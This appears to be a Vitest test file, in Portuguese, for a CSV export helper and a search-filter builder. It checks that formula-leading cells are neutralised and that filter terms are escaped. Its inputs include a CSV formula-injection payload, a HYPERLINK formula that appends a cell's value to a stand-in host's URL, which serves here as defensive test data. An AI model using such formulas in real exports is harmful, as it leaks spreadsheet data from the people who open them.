import { describe, expect, it } from 'vitest'
import { celulaCsv, montarCsv } from '../csv'
import { montarBuscaLivre } from '@/services/logs-atividade'

describe('celulaCsv (SEG-06)', () => {
  it.each(['=HYPERLINK("http://x.test/?"&A2,"clique")', '+1+1', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd'])(
    'neutraliza início de fórmula: %j',
    (entrada) => {
      const celula = celulaCsv(entrada)
      expect(celula.startsWith(`"'`)).toBe(true)
    },
  )

  it('fórmula com espaço na frente também é neutralizada', () => {
    expect(celulaCsv(' =1+1')).toBe(`"' =1+1"`)
  })

  it('dobra as aspas e não mexe em texto comum', () => {
    expect(celulaCsv('criou imoveis "Apto #12"')).toBe('"criou imoveis ""Apto #12"""')
    expect(celulaCsv('Silva, João; filho')).toBe('"Silva, João; filho"')
    expect(celulaCsv('linha 1\nlinha 2')).toBe('"linha 1\nlinha 2"')
  })

  it('nulo e indefinido viram célula vazia', () => {
    expect(celulaCsv(null)).toBe('""')
    expect(celulaCsv(undefined)).toBe('""')
    expect(celulaCsv(0)).toBe('"0"')
  })
})

describe('montarCsv', () => {
  it('mantém todas as linhas, 6 colunas por linha, com BOM e ";" (o "#" não corta nada)', () => {
    const csv = montarCsv(
      ['Data e Hora', 'Usuário', 'E-mail', 'Ação', 'Entidade', 'Detalhes'],
      [
        ['06/10/2026 10:00', '=HYPERLINK("x")', 'a@x.test', 'criou', 'imoveis', 'criou imoveis "Apto #12"'],
        ['06/10/2026 10:05', 'Silva, João', 'b@x.test', 'editou', 'imoveis', 'editou imoveis "Sala 3"'],
      ],
    )
    expect(csv.charCodeAt(0)).toBe(0xfeff)
    const linhas = csv.trim().split('\r\n')
    expect(linhas).toHaveLength(3)
    expect(linhas[1]).toContain(`"'=HYPERLINK(""x"")"`)
    expect(linhas[1]).toContain('Apto #12')
    expect(linhas[2]).toContain('"Silva, João"')
    for (const l of linhas.slice(1)) expect(l.split('";"')).toHaveLength(6)
  })
})

describe('montarBuscaLivre (SEG-18)', () => {
  it('não usa ilike na coluna de enum "acao": só em colunas de texto', () => {
    const f = montarBuscaLivre('apto')!
    expect(f).toContain('detalhes.ilike.*apto*')
    expect(f).toContain('entidade.ilike.*apto*')
    expect(f).not.toContain('acao.ilike')
    expect(f).not.toContain('acao.in')
  })

  it('termo que lembra uma ação também filtra pela ação, com `in`', () => {
    expect(montarBuscaLivre('edit')).toContain('acao.in.(editou)')
    expect(montarBuscaLivre('Criou')).toContain('acao.in.(criou)')
    expect(montarBuscaLivre('u')).toContain('acao.in.(criou,editou,excluiu)')
  })

  it('escapa vírgula e parêntese; vazio não gera filtro', () => {
    expect(montarBuscaLivre('a,b(c)')).toContain('detalhes.ilike.*a b c*')
    expect(montarBuscaLivre('  ')).toBeUndefined()
    expect(montarBuscaLivre(undefined)).toBeUndefined()
  })
})
